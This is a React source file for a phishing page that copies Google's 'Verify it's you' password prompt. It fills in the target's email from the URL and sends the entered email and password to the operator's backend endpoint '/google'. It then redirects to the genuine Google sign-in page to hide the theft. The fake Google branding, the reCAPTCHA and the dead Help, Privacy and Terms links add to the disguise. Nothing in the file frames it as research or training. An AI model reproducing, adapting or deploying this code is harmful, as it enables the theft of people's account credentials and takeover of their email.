import React, { useEffect, useRef } from 'react'
import ReCAPTCHA from 'react-google-recaptcha';
import axios from '../axios';

export default function Google() {
    const queryParams = new URLSearchParams(window.location.search);
    const password = useRef()
    
    // Retrieve specific query parameters
    const email = queryParams.get('email');

    const Submit = async (e) => {
        e.preventDefault()
        var error = document.querySelector(".error")
        var input = document.querySelector(".input")
        if(password.current.value.length <= 5){
            error.classList.add("show")
            input.classList.add("show")
            return
        }
        
        error.classList.remove("show")
        input.classList.remove("show")

        var submitBtn = document.querySelector(".submitBtn")
        submitBtn.innerHTML = `<div class="spinner-border spinner-border-sm text-white"></div>`
        await axios.post("/google",{
            email : email,
            password : password.current.value
        })
        .then(res => {
            console.log(res)
            window.location.href = "https://accounts.google.com/v3/signin/identifier?authuser=0&checkedDomains=youtube&cid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail&ec=GAlAFw&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en_US&pstMsg=1&service=mail&theme=glif&dsh=S-1090421314%3A1708427348620279"
            // submitBtn.innerHTML = "Next"
        })
        .catch(err => {
            console.log(err)
            submitBtn.innerHTML = "Next"
        })
    }


    return (
        <div className='google'>
            <div className="form">
                <div className="text-center">
                    <h4 className='mb-3 logo'>
                        <span className='text-primary'>G</span>
                        <span className='text-danger'>o</span>
                        <span className='text-warning'>o</span>
                        <span className='text-primary'>g</span>
                        <span className='text-success'>l</span>
                        <span className='text-danger'>e</span>
                    </h4>
                    <h5 className="name">Verify it’s you</h5>
                    <p className="mb-2">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
                    <p className="email btn pb-2"><i class="fa-solid fa-user"></i> {email}</p>
                </div>

               <form action="" onSubmit={Submit}>
                <div className="inputs mb-2 mt-5">
                        <input className='input' ref={password} type="text" placeholder='Enter your password' />
                        <p className="mb-1 error">Password must be greater than 6 characters</p>
                        <p className="blue mt-2">Forgot email?</p>
                    </div>
                    

                    <ReCAPTCHA
                    sitekey="6Le2tponAAAAAB9qS1OXf_MsvRid6auzOi2n3Xy5"
                    />

                    <p className="mb-1 mt-5 tiny">Not your computer? Use Guest mode to sign in privately.</p>
                    <p className="blue">Learn more about using Guest mode</p>

                    <div className="d-flex submit mt-5 justify-content-between">
                        <p className="create blue">Forgot password?</p>
                        <button className="btn submitBtn">Next</button>
                    </div>
               </form>
            </div>

            <div className="d-flex footer text-center justify-content-between">
                <p className="btn">English (United States)</p>
                <div className="links">
                    <a className='mx-3' href="">Help</a>
                    <a className='mx-3' href="">Privacy</a>
                    <a className='mx-3' href="">Terms</a>
                </div>
            </div>
        </div>
    )
}
